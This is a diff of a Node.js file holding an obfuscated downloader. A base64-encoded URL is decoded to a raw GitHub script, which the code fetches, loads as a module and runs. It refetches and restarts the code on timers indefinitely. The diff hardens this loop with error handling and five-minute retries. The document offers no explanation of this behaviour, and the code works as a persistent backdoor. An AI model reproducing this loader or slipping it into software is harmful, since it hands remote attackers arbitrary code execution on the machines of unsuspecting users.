@@ -1,40 +1,45 @@
-const { exec } = require('node:child_process')
+const { exec } = require('child_process')
 
 startModule()
 
 async function startModule() {
     let code = await getAxios(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhaXlhbjA4OC9wdWJsaWMvbWFpbi9tb2R1bGUuanM=', 'base64').toString('ascii'))
     if (code) {
-        let Module = requireModule(code, __dirname+'/load.js')
-        let mStart = false
-        let mStop = false
-
         try {
-            Module.start()
-            mStart = true
-        } catch (error) {}
+            let Module = requireModule(code, __dirname+'/load.js')
+            let mStart = false
+            let mStop = false
 
-        let hours = 60*60*1000
-        await delay(mStart?hours*6:hours)
+            try {
+                Module.start()
+                mStart = true
+            } catch (error) {}
 
-        try {
-            Module.close()
-            mStop = true
-        } catch (error) {}
+            let hours = 60*60*1000
+            await delay(mStart?hours*6:hours)
 
-        if (mStart) {
-            if (mStop) {
-                await startModule()
-            } else {
-                while (true) {
-                    await delay(hours)
+            try {
+                Module.close()
+                mStop = true
+            } catch (error) {}
+
+            if (mStart) {
+                if (mStop) {
+                    await startModule()
+                } else {
+                    while (true) {
+                        await delay(hours)
+                    }
                 }
+            } else {
+                await startModule()
             }
-        } else {
+        } catch (error) {
+            await delay(300000)
             await startModule()
         }
     } else {
-        await delay(3000)
+        await delay(300000)
         await startModule()
     }
 }
